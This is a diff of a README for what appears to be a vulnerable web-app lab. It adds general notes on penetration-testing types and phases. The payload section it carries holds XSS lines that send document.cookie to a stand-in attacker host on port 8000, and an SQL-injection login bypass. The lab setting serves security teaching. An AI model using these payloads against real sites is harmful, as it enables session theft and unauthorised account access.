@@ -31,9 +31,9 @@ In ordeer to collect stolen cookies we use a simple http server. Lunch it using:
 - Visit: http://localhost:9000/sqlI.php 
 
 ## Payloads
-### Reflected
+### XSS Reflected
     <script>window.location.href="http://<attacker IP>:8000/a.html?c="+document.cookie</script>
-### Stored
+### XSS Stored
 Not the best approach, generates a bunch of requests, very loud
 
     <img src="x" onerror=this.src='http://<attacker IP>:8000/'+document.cookie; />
@@ -49,7 +49,48 @@ To gain access to the first account saved in the database
 To gain access to an account by knowing the username
 
     [username]' OR 1=1 --
-		
+
+  # Black Box vs White Box Penetration Testing
+
+Penetration testing is categorized into three main types based on the level of information and access provided to the tester: **black box**, **white box**, and **gray box**.
+
+### Black Box Penetration Testing
+- **Definition**: Simulates an attack from an external hacker with no prior knowledge of the system.
+- **Process**: The tester gathers all necessary information through reconnaissance and attempts to exploit vulnerabilities.
+- **Use Case**: Ideal for assessing the security of external-facing assets and services.
+
+### White Box Penetration Testing
+- **Definition**: The tester is provided with comprehensive system information (e.g., source code, architecture diagrams, and credentials).
+- **Process**: This allows for a deep, thorough examination of both internal and external vulnerabilities.
+- **Use Case**: Most time-consuming, requires significant data review. Provides an exhaustive security evaluation.
+
+### Gray Box Penetration Testing
+- **Definition**: A compromise between black and white box testing, where the tester is given partial information (e.g., login credentials or partial architecture details).
+- **Use Case**: Suitable for understanding potential insider threats or risks from authenticated users. More time- and cost-effective than black box testing.
+
+---
+
+# Pen Test Life Cycle
+
+The life cycle of a penetration test consists of five main phases: **reconnaissance**, **scanning**, **exploitation of vulnerabilities**, **maintaining access**, and **reporting**.
+
+### Reconnaissance
+- **Description**: Gathering information about the system or infrastructure to be tested, including public data, network mapping, and identifying active services.
+
+### Scanning
+- **Description**: Performing automated and semi-automated scans to identify vulnerabilities in the system. This includes port scanning, service and application enumeration, and user identification.
+
+### Exploitation of Vulnerabilities
+- **Description**: The tester attempts to exploit identified vulnerabilities to access the system, using techniques such as SQL injection or XSS.
+
+### Maintaining Access
+- **Description**: If the tester successfully gains access, they may attempt to maintain access to explore further or execute subsequent attacks.
+
+### Reporting
+- **Description**: Creating a detailed report describing the identified vulnerabilities, how they were exploited, and the necessary actions to mitigate them. This report is used to improve system security.
+
+Each phase builds on information gathered in previous stages and may require additional details or verification throughout the process.
+
 
 ## Vulnerabilities Scenario and actions
 ### Steps for Vulnerability Analysis
